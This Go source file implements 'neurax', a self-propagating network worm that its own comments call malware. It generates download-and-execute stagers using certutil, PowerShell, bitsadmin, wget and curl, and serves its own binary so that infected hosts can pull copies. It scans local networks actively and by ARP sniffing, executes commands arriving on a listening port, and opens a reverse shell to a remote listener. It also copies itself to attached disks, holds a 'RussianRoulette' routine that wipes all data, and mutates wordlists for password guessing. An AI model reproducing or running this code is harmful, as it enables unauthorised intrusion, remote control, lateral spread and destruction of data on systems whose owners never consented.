package neurax

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	ps "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	cf "github.com/redcode-labs/Coldfire"
	"github.com/valyala/fasthttp"
	"github.com/yelinaung/go-haikunator"
	"github.com/zbiljic/go-filelock"
)

const (
	tearDownServer = time.Millisecond * 500
	listenerTick   = time.Millisecond * 10
)

var InfectedHosts []string
var ReceivedCommands []string

var spec = []string{"!", "!@", "!@#", "!@#$", "!@#$%"}

var LangExecutors = map[string]string{
	"python_os":         `import os; os.system("COMMAND")`,
	"python_subprocess": `import subprocess; subprocess.call("COMMAND", shell=True)`,
	"javascript":        `var shl = WScript.CreateObject("WScript.Shell"); shl.Run("COMMAND");`,
	"php":               `exec("COMMAND")`,
	"ruby":              "`COMMAND`",
	"perl":              `system("COMMAND");`,
	"lua":               `os.execute("COMMAND")`,
	"mysql":             `\! COMMAND`,
	"redis":             `eval "os.execute('COMMAND')"`,
}

type (
	// Config has all features of neurax malware that can be configured
	Config struct {
		Stager                   string
		StagerSudo               bool
		StagerBg                 bool
		StagerRetry              int
		StagerRemovalDelay       bool
		Port                     int
		CommPort                 int
		CommProto                string
		LocalIp                  string
		Path                     string
		FileName                 string
		Platform                 string
		Cidr                     string
		ScanPassive              bool
		ScanActive               bool
		ScanActiveTimeout        int
		ScanPassiveTimeout       int
		ScanPassiveIface         string
		ScanPassiveAll           bool
		ScanPassiveNoArp         bool
		ScanFast                 bool
		ScanShaker               bool
		ScanShakerPorts          []int
		ScanFirst                []string
		ScanArpCache             bool
		ScanActiveThreads        int
		ScanFullRange            bool
		ScanGatewayFirst         bool
		ScanFirstOnly            bool
		Base64                   bool
		ScanRequiredPort         int
		Verbose                  bool
		Remove                   bool
		ScanInterval             string
		ScanHostInterval         string
		ReverseListener          string
		ReverseProto             string
		PreventReexec            bool
		ExfilAddr                string
		WordlistExpand           bool
		WordlistMutators         []string
		WordlistPermuteNum       int
		WordlistPermuteSeparator string
		WordlistShuffle          bool
		AllocNum                 int
		Blacklist                []string
		FastHTTP                 bool
		Debug                    bool
		NoInfectCheck            bool
	}
	// nrx keeps a self copping and nrx malware capabilities
	Nrx struct {
		cfg Config
	}
)

// Default is a default configuration for neurax malware
var Default = Config{
	Stager:                   "random",
	StagerSudo:               false,
	StagerBg:                 false,
	StagerRetry:              0,
	StagerRemovalDelay:       true,
	Port:                     6741, //coldfire.RandomInt(2222, 9999),
	CommPort:                 7777,
	CommProto:                "udp",
	ScanRequiredPort:         0,
	LocalIp:                  cf.GetLocalIp(),
	Path:                     ".",
	FileName:                 "random",
	Platform:                 runtime.GOOS,
	Cidr:                     cf.GetLocalIp() + "/24",
	ScanPassive:              false,
	ScanActive:               true,
	ScanActiveTimeout:        2,
	ScanPassiveTimeout:       50,
	ScanPassiveIface:         "default",
	ScanPassiveAll:           false,
	ScanPassiveNoArp:         false,
	ScanFast:                 false,
	ScanShaker:               false,
	ScanShakerPorts:          []int{21, 80},
	ScanFirst:                []string{},
	ScanArpCache:             false,
	ScanActiveThreads:        10,
	ScanFullRange:            false,
	ScanGatewayFirst:         false,
	ScanFirstOnly:            false,
	Base64:                   false,
	Verbose:                  false,
	Remove:                   false,
	ScanInterval:             "2m",
	ScanHostInterval:         "none",
	ReverseListener:          "none",
	ReverseProto:             "udp",
	PreventReexec:            true,
	ExfilAddr:                "none",
	WordlistExpand:           false,
	WordlistMutators:         []string{"single_upper", "encapsule"},
	WordlistPermuteNum:       2,
	WordlistPermuteSeparator: "-",
	WordlistShuffle:          false,
	AllocNum:                 5,
	Blacklist:                []string{},
	FastHTTP:                 false,
	Debug:                    false,
	NoInfectCheck:            true,
}

// New creates pointer to instance of Rat
func New(cfg Config) *Nrx {
	return &Nrx{cfg}
}

// ReportError reports error in verbose way
func (nrx *Nrx) ReportError(message string, e error) {
	if e != nil && nrx.cfg.Verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if nrx.cfg.Remove {
			if err := os.Remove(os.Args[0]); err != nil {
				os.Exit(1)
			}
		}
	}
}

// StagerLang uses specified language
func (nrx *Nrx) StagerLang(name string) string {
	return strings.Replace(LangExecutors[name], "COMMAND", nrx.Stager(), -1)
}

// Stager prepares command stager that downloads and executes current binary
func (nrx *Nrx) Stager() string {
	var stagers [][]string
	var stager []string
	var paths []string
	var b64Decoder string
	var sudo string
	stagerRetry := strconv.Itoa(nrx.cfg.StagerRetry + 1)
	windowsStagers := [][]string{
		{"certutil", `for /l %%Neurax in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH/FILENAME`},
		{"powershell", `for /l %%Neurax in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH/FILENAME`},
		{"bitsadmin", `for /l %%Neurax in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 BACKGROUND SAVE_PATH\FILENAME && REMOVAL_DELAY del SAVE_PATH\FILENAME`},
	}
	linuxStagers := [][]string{
		{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH/./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
		{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME && SUDO B64 chmod +x SAVE_PATH/FILENAME && SUDO SAVE_PATH./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
		{"httrack", `SUDO apt-get install -y httrack && for i in {1..RETRY}; do SUDO httrack URL && export u="URL" && cd ${u#https://} && chmod +x FILENAME && SUDO ./FILENAME BACKGROUND; done && REMOVAL_DELAY rm SAVE_PATH/FILENAME`},
	}
	linuxSavePaths := []string{"/tmp", "/lib", "~",
		"/etc", "/usr", "/usr/share"}
	windowsSavePaths := []string{`%SYSTEMDRIVE%\$recycle.bin\`, `%ALLUSERSAPPDATA%\MicrosoftHelp\`}
	var background string
	switch nrx.cfg.Platform {
	case "windows":
		stagers = windowsStagers
		paths = windowsSavePaths
		if nrx.cfg.Base64 {
			b64Decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
		if nrx.cfg.StagerBg {
			background = "start /b"
		}
	case "linux", "darwin":
		stagers = linuxStagers
		paths = linuxSavePaths
		if nrx.cfg.Base64 {
			b64Decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
		if nrx.cfg.StagerBg {
			background = "> /dev/null 2>&1 &"
		}
	}
	if nrx.cfg.Stager == "random" {
		stager = cf.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == nrx.cfg.Stager {
				stager = st
			}
		}
	}
	selectedStagerCommand := stager[1]
	if nrx.cfg.Stager == "chain" {
		chainedCommands := make([]string, 0, len(stagers))
		for s := range stagers {
			st := stagers[s]
			chainedCommands = append(chainedCommands, st[1])
		}
		separator := ";"
		if runtime.GOOS == "windows" {
			separator = "&&"
		}
		selectedStagerCommand = strings.Join(chainedCommands, " "+separator+" ")
	}
	if nrx.cfg.Path == "random" {
		nrx.cfg.Path = cf.RandomSelectStr(paths)
	}
	if nrx.cfg.Path == "." {
		selectedStagerCommand = strings.Replace(selectedStagerCommand, "SAVE_PATH/", "./", -1)
		selectedStagerCommand = strings.Replace(selectedStagerCommand, "SAVE_PATH\\", "", -1)
	}
	if nrx.cfg.FileName == "random" {
		nrx.cfg.FileName = cf.RandomString(cf.RandomInt(4, 10))
	}
	if nrx.cfg.FileName == "random" && nrx.cfg.Platform == "windows" {
		nrx.cfg.FileName += ".exe"
	}
	if nrx.cfg.StagerSudo {
		sudo = "sudo"
	}
	var removalDelay string
	if nrx.cfg.StagerRemovalDelay {
		removalDelay = "sleep 5"
	}
	parsedURL, err := url.Parse(fmt.Sprintf("http://%s:%d/%s", nrx.cfg.LocalIp, nrx.cfg.Port, nrx.cfg.FileName))
	if err != nil {
		os.Exit(1)
	}
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "URL", parsedURL.String(), -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "FILENAME", nrx.cfg.FileName, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "SAVE_PATH", nrx.cfg.Path, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "B64", b64Decoder, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "SUDO", sudo, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "RETRY", stagerRetry, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "BACKGROUND", background, -1)
	selectedStagerCommand = strings.Replace(selectedStagerCommand, "REMOVAL_DELAY", removalDelay, -1)
	nrx.Debug("Created command stager: " + selectedStagerCommand)
	return selectedStagerCommand
}

// Server start server serving binary self as bytes or base64 encoded string
func (nrx *Nrx) Server(cancel context.CancelFunc) {
	nflck, err := filelock.New(".nflck") // Mutex to ensure single process instance within a targeted system
	if err != nil {
		os.Exit(1)
	}
	defer func() {
		if err := nflck.Unlock(); err != nil {
			os.Exit(1)
		}
	}()
	data, err := os.ReadFile(os.Args[0])
	if err != nil {
		os.Exit(1)
	}
	if nrx.cfg.Base64 {
		data = []byte(cf.B64E(string(data)))
	}

	h := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.ServeContent(w, r, nrx.cfg.FileName, time.Now(), bytes.NewReader(data))
	})

	server := &http.Server{Addr: fmt.Sprintf(":%v", fmt.Sprintf(":%d", nrx.cfg.Port)), Handler: h}
	idleCC := make(chan struct{})
	go handleShutdown(server, idleCC)
	if err := server.ListenAndServe(); err != http.ErrServerClosed {
		os.Exit(1)
	}
	cancel()
	<-idleCC
}

func handleShutdown(srv *http.Server, idleCC chan struct{}) {
	sigint := make(chan os.Signal, 1)
	signal.Notify(sigint, os.Interrupt)
	<-sigint

	ctx, cancel := context.WithTimeout(context.Background(), tearDownServer)
	defer cancel()
	if err := srv.Shutdown(ctx); err != nil {
		os.Exit(1)
	}
	close(idleCC)
}

// IsHostActive validates is port active when at least one port is open
func (nrx *Nrx) IsHostActive(target string) bool {
	if cf.Contains(nrx.cfg.Blacklist, target) {
		return false
	}
	if nrx.cfg.ScanShaker {
		for _, port := range nrx.cfg.ScanShakerPorts {
			timeout := time.Duration(nrx.cfg.ScanActiveTimeout) * time.Second
			portStr := strconv.Itoa(port)
			_, err := net.DialTimeout("tcp", target+portStr, timeout)
			if err == nil {
				nrx.Debug("Found active host: " + target)
				return true
			}
		}
	} else {
		first := 19
		last := 200
		if nrx.cfg.ScanFullRange {
			last = 65535
		}
		if nrx.cfg.ScanFast {
			nrx.cfg.ScanActiveTimeout = 2
			nrx.cfg.ScanActiveThreads = 20
			first = 21
			last = 81
		}
		pscan := ps.NewPortScanner(target, time.Duration(nrx.cfg.ScanActiveTimeout)*time.Second, nrx.cfg.ScanActiveThreads)
		openedPorts := pscan.GetOpenedPort(first, last)
		if len(openedPorts) != 0 {
			if nrx.cfg.ScanRequiredPort == 0 {
				nrx.Debug("Found active host: " + target)
				return true
			} else {
				if cf.PortscanSingle(target, nrx.cfg.ScanRequiredPort) {
					nrx.Debug("Found active host: " + target)
					return true
				}
			}
		}
	}
	return false
}

// IsHostInfected validates if host is infected with Neurax
func (nrx *Nrx) IsHostInfected(target string) bool {
	if nrx.cfg.NoInfectCheck {
		return false
	}
	if cf.Contains(nrx.cfg.Blacklist, target) {
		return false
	}
	if cf.Contains(InfectedHosts, target) {
		return true
	}
	targetUrl := fmt.Sprintf("http://%s:%d/", target, nrx.cfg.Port)
	if nrx.cfg.FastHTTP {
		req := fasthttp.AcquireRequest() // TODO: we are not using this package it in Server, go with one approach, use or do not use external lib
		defer fasthttp.ReleaseRequest(req)
		req.SetRequestURI(targetUrl)
		resp := fasthttp.AcquireResponse()
		defer fasthttp.ReleaseResponse(resp)
		err := fasthttp.Do(req, resp)
		if err != nil {
			return false
		}
		if resp.StatusCode() == fasthttp.StatusOK {
			InfectedHosts = append(InfectedHosts, target)
			InfectedHosts = cf.RemoveFromSlice(InfectedHosts, nrx.cfg.LocalIp)
			nrx.Debug("Found infected host: " + target)
			return true
		}
	} else {
		rsp, err := http.Get(targetUrl)
		if err != nil {
			return false
		}
		if rsp.StatusCode == 200 {
			InfectedHosts = append(InfectedHosts, target)
			InfectedHosts = cf.RemoveFromSlice(InfectedHosts, nrx.cfg.LocalIp)
			nrx.Debug("Found infected host: " + target)
			return true
		}
		return false
	}
	return false
}

func (nrx *Nrx) handleCommand(cmd string) {
	if cmd == "purge" {
		nrx.PurgeSelf()
	}
	if nrx.cfg.PreventReexec {
		if cf.Contains(ReceivedCommands, cmd) {
			return
		}
		ReceivedCommands = append(ReceivedCommands, cmd)
	}
	if _, err := cf.CmdOut(cmd); err != nil {
		os.Exit(1)
	}
}

// OpenComm opens port and waits form command
func (nrx *Nrx) OpenComm(ctx context.Context) {
	l, err := net.Listen(nrx.cfg.CommProto, "0.0.0.0:"+strconv.Itoa(nrx.cfg.CommPort))
	nrx.ReportError("Comm listen error", err)
	t := time.NewTicker(listenerTick)
L:
	for {
		select {
		case <-ctx.Done():
			break L
		case <-t.C:
			conn, err := l.Accept()
			if err != nil {
				nrx.ReportError("Conn accept error", err)
				continue
			}
			buff := make([]byte, 1024)
			l, err := conn.Read(buff)
			if err != nil {
				nrx.ReportError("Conn read error", err)
				continue
			}
			cmd := string(buff[:l-1])
			nrx.Debug("Received command: " + cmd)
			go nrx.handleCommand(cmd)
			if err := conn.Close(); err != nil {
				nrx.ReportError(" Conn close error", err)
				continue
			}
		}
	}
}

// Reverse launches a reverse shell. Each received command is passed to handleCommand func
func (nrx *Nrx) Reverse(ctx context.Context) {
	conn, _ := net.Dial(nrx.cfg.ReverseProto, nrx.cfg.ReverseListener)
	t := time.NewTicker(listenerTick)
L:
	for {
		select {
		case <-ctx.Done():
			break L
		case <-t.C:
			command, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				os.Exit(1)
			}
			command = strings.TrimSuffix(command, "\n")
			go nrx.handleCommand(command)
		}
	}
}

func (nrx *Nrx) scanPassiveSingleIface(f func(string), iface string) {
	var snapshotLen int32 = 1024
	timeout := time.Duration(nrx.cfg.ScanPassiveTimeout) * time.Second
	if nrx.cfg.ScanFast {
		timeout = 50 * time.Second
	}
	handler, err := pcap.OpenLive(iface, snapshotLen, false, timeout)
	nrx.ReportError("Cannot open device", err)
	if !nrx.cfg.ScanPassiveNoArp {
		if err := handler.SetBPFFilter("arp"); err != nil {
			nrx.ReportError(" Set BPF filter error", err)
			return
		}
	}
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer != nil {
			ip, _ := ipLayer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != nrx.cfg.LocalIp && !nrx.IsHostInfected(source) && source != "255.255.255.255" {
				go f(source)
			}
			if destination != nrx.cfg.LocalIp && !nrx.IsHostInfected(destination) && destination != "255.255.255.255" {
				go f(destination)
			}
		}
	}
}

func (nrx *Nrx) scanPassive(f func(string)) {
	currentIface, _ := cf.Iface()
	ifacesToUse := []string{currentIface}
	if nrx.cfg.ScanPassiveIface != "default" {
		ifacesToUse = []string{nrx.cfg.ScanPassiveIface}
	}
	devices, err := pcap.FindAllDevs()
	deviceNames := make([]string, 0, len(devices))
	for _, dev := range devices {
		deviceNames = append(deviceNames, dev.Name)
	}
	nrx.ReportError("Cannot obtain network interfaces", err)
	if nrx.cfg.ScanPassiveAll {
		ifacesToUse = append(ifacesToUse, deviceNames...)
	}
	for _, device := range ifacesToUse {
		go nrx.scanPassiveSingleIface(f, device)
	}
}

func targetsLookup(targets []string) []string {
	res := make([]string, 0, len(targets))
	for _, target := range targets {
		if cf.RegexMatch("ip", target) {
			res = append(res, target)
		} else {
			ipAddr, err := cf.DnsLookup(target)
			if err != nil {
				return []string{}
			}
			res = append(res, ipAddr...)
		}
	}
	return res
}

func (nrx *Nrx) scanActive(f func(string)) {
	var targets []string
	if nrx.cfg.ScanGatewayFirst {
		gateway := cf.GetGatewayIP()
		targets = append(targets, gateway)
		nrx.Debug("Added gateway to targets pool: " + gateway)
	}
	if len(nrx.cfg.ScanFirst) != 0 {
		targets = append(targets, targetsLookup(nrx.cfg.ScanFirst)...)
	}
	if nrx.cfg.ScanFirstOnly {
		targets = targetsLookup(nrx.cfg.ScanFirst)
	}
	if nrx.cfg.ScanArpCache {
		for ip := range arp.Table() {
			if !nrx.IsHostInfected(ip) {
				targets = append(targets, ip)
			}
		}
		nrx.Debug(cf.F("Found %d targets in ARP cache", len(arp.Table())))
	}
	fullAddrRange, _ := cf.ExpandCidr(nrx.cfg.Cidr)
	for _, addr := range fullAddrRange {
		if !cf.Contains(nrx.cfg.Blacklist, addr) {
			targets = append(targets, addr)
		}
	}
	targets = cf.RemoveFromSlice(targets, nrx.cfg.LocalIp)
	for _, target := range targets {
		nrx.Debug("Scanning " + target)
		if nrx.IsHostActive(target) && !nrx.IsHostInfected(target) {
			nrx.Debug("Scanned " + target)
			go f(target)
			if nrx.cfg.ScanHostInterval != "none" {
				time.Sleep(time.Duration(cf.IntervalToSeconds(nrx.cfg.ScanHostInterval)) * time.Second)
			}
		}
	}
}

func (nrx *Nrx) scanCore(f func(string)) {
	if nrx.cfg.ScanPassive {
		go nrx.scanPassive(f)
	}
	if nrx.cfg.ScanActive {
		go nrx.scanActive(f)
	}
}

// Scan scans network for new hosts
func (nrx *Nrx) Scan(f func(string)) {
	for {
		nrx.scanCore(f)
		time.Sleep(time.Duration(cf.IntervalToSeconds(nrx.cfg.ScanInterval)))
	}
}

// Debug prints msg if debug is on
func (nrx *Nrx) Debug(msg string) {
	if nrx.cfg.Debug {
		cf.PrintInfo(msg)
	}
}

// Disks copies current binary to all found disks
func Disks() error {
	selectedName := genHaiku()
	if runtime.GOOS == "windows" {
		selectedName += ".exe"
	}
	disks, err := cf.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := cf.CopyFile(os.Args[0], d+"/"+selectedName)
		if err != nil {
			return err
		}
	}
	return nil
}

// ZIPSelf the binary zips itself and saves under save name in archive
func ZIPSelf() error {
	archiveName := os.Args[0] + ".zip"
	filesToZip := []string{os.Args[0]}
	return cf.MakeZip(archiveName, filesToZip)
}

func genHaiku() string {
	h := haikunator.New(time.Now().UTC().UnixNano())
	return h.Haikunate()
}

// Purge removes binary from all nodes that can be reached
func (nrx *Nrx) Purge() {
	DataSender := cf.SendDataUDP
	if nrx.cfg.CommProto == "tcp" {
		DataSender = cf.SendDataTCP
	}
	for _, host := range InfectedHosts {
		err := DataSender(host, nrx.cfg.CommPort, "purge")
		nrx.ReportError("Cannot perform purge", err)
	}
	nrx.handleCommand("purge")
}

// PurgeSelf removes binary from host and quits
func (nrx *Nrx) PurgeSelf() {
	if err := os.Remove(os.Args[0]); err != nil {
		os.Exit(1)
	}
	os.Exit(0)
}

// WordEncapsulate encapsulates word in punctuations marks
func WordEncapsulate(word string) []string {
	return []string{
		"!" + word + "!",
		"?" + word + "?",
		":" + word + ":",
		"@" + word + "@",
		"#" + word + "#",
		"$" + word + "$",
		"%" + word + "%",
		"^" + word + "^",
		"&" + word + "&",
		"*" + word + "*",
		"(" + word + ")",
		"[" + word + "",
		"<" + word + ">",
	}
}

// WordCyrillicReplace replaces cyrillic chars with ascii chars
func WordCyrillicReplace(word string) []string { // TODO: why not use us utf8 encode mapping
	var wordlist []string
	refs := map[string]string{
		"й": "q", "ц": "w", "у": "e",
		"к": "r", "е": "t", "н": "y",
		"г": "u", "ш": "i", "щ": "o",
		"з": "p", "ф": "a", "ы": "s",
		"в": "d", "а": "f", "п": "g",
		"р": "h", "о": "j", "л": "k",
		"д": "l", "я": "z", "ч": "x",
		"с": "c", "м": "v", "и": "b",
		"т": "n", "ь": "m"}

	rusWord := word
	for k, v := range refs {
		rusWord = strings.Replace(rusWord, v, k, -1)
	}
	wordlist = append(wordlist, rusWord)
	return wordlist
}

// WordSingleUpperTransform transforms word to uppercase letter slice
func WordSingleUpperTransform(word string) []string {
	res := make([]string, 0, utf8.RuneCountInString(word))
	for i := range word {
		splitted := strings.Fields(word)
		splitted[i] = strings.ToUpper(splitted[i])
		res = append(res, strings.Join(splitted, ""))
	}
	return res
}

// WordBasicLeet
func WordBasicLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0", "i": "1",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

// WordFullLeet
func WordFullLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0",
		"t": "7", "s": "5", "S": "$", "h": "#", "i": "1",
		"u": "v",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

// WordRevert reverts word to the slice of letters
func WordRevert(word string) []string {
	return []string{cf.Revert(word)}
}

// WordDuplicate duplicates word in to the slice of letters
func WordDuplicate(word string) []string {
	return []string{word + word}
}

// WordCharSwap swaps first and last rune/char in string
func WordCharSwap(word string) []string {
	w := []rune(word)
	w[0], w[len(w)] = w[len(w)], w[0]
	return []string{string(w)}
}

// WordSpecialCharsAppend appends special chars to the word
func WordSpecialCharsAppend(word string) []string {
	res := make([]string, 0, len(spec))
	for _, s := range spec {
		res = append(res, word+s)
	}
	return res
}

// WordSpecialCharsPrepend prepends special characters to
func WordSpecialCharsPrepend(word string) []string {
	res := make([]string, 0, len(spec))
	for _, s := range spec {
		res = append(res, s+word)
	}
	return res
}

// RussianRoulette deletes all data in the machines
func RussianRoulette() error {
	if cf.RandomInt(1, 6) == 6 {
		return cf.Wipe()
	}
	return nil
}

// Wordlist transformed words from input slice
func (nrx *Nrx) Wordlist(words ...string) []string {
	useAll := cf.Contains(nrx.cfg.WordlistMutators, "all")
	var wordlist []string
	/*for i := 0; i < nrx.cfg.WordlistCommonNum; i++ {
		wordlist = append(wordlist, CommonPasswords[i])
	}
	if len(nrx.cfg.WordlistCommonCountries) != 0 {
		for cn, num := range nrx.cfg.WordlistCommonCountries {
			wordlist = append(wordlist, CommonPasswordsCountries[cn][0:num]...)
		}
	}*/
	for _, word := range words {
		firstToUpper := strings.ToUpper(string(word[0])) + word[1:]
		lastToUpper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)-1]))
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, firstToUpper)
		wordlist = append(wordlist, lastToUpper)
		wordlist = append(wordlist, firstToUpper+"1")
		wordlist = append(wordlist, firstToUpper+"12")
		wordlist = append(wordlist, firstToUpper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
		if nrx.cfg.WordlistExpand {
			if cf.Contains(nrx.cfg.WordlistMutators, "encapsule") || useAll {
				wordlist = append(wordlist, WordEncapsulate(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "cyryllic") || useAll {
				wordlist = append(wordlist, WordCyrillicReplace(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "single_upper") || useAll {
				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "basic_leet") || useAll {
				wordlist = append(wordlist, WordBasicLeet(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "full_leet") || useAll {
				wordlist = append(wordlist, WordFullLeet(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "revert") || useAll {
				wordlist = append(wordlist, WordRevert(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "duplicate") || useAll {
				wordlist = append(wordlist, WordDuplicate(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "char_swap") || useAll {
				wordlist = append(wordlist, WordCharSwap(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "special_append") || useAll {
				wordlist = append(wordlist, WordSpecialCharsAppend(word)...)
			}
			if cf.Contains(nrx.cfg.WordlistMutators, "special_prepend") || useAll {
				wordlist = append(wordlist, WordSpecialCharsPrepend(word)...)
			}
		}
	}
	if cf.Contains(nrx.cfg.WordlistMutators, "permute") || useAll {
		wordlist = append(wordlist, nrx.WordlistPermute(words...)...)
	}
	wordlist = cf.RemoveDuplicatesStr(wordlist)
	if nrx.cfg.WordlistShuffle {
		wordlist = cf.ShuffleSlice(wordlist)
	}
	return wordlist
}

// WordlistPermute permutes words in to slice
func (nrx *Nrx) WordlistPermute(words ...string) []string {
	res := make([]string, 0, len(words))
	permuted := ""
	sep := nrx.cfg.WordlistPermuteSeparator
	for _, word := range words {
		curPermLen := len(strings.Split(permuted, sep))
		selected := cf.RandomSelectStr(words)
		if !strings.Contains(permuted, selected) && curPermLen < nrx.cfg.WordlistPermuteNum {
			permuted += word + sep + selected + sep
			res = append(res, permuted)
		}
	}
	return res[:]
}

// SetTTL sets TTL
func (nrx *Nrx) SetTTL(interval string) {
	firstExec := time.Now()
	for {
		time.Sleep(time.Duration(10))
		passed := time.Since(firstExec).Seconds()
		if int(passed) > cf.IntervalToSeconds(interval) {
			nrx.PurgeSelf()
		}
	}
}

// Migrate migrates binary from currant path to path
func (nrx *Nrx) Migrate(path string) error {
	currentPath, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	if strings.Contains(currentPath, path) {
		return nil
	}
	nrx.Debug("Migrating -> " + path)
	return cf.CopyFile(os.Args[0], path)
}
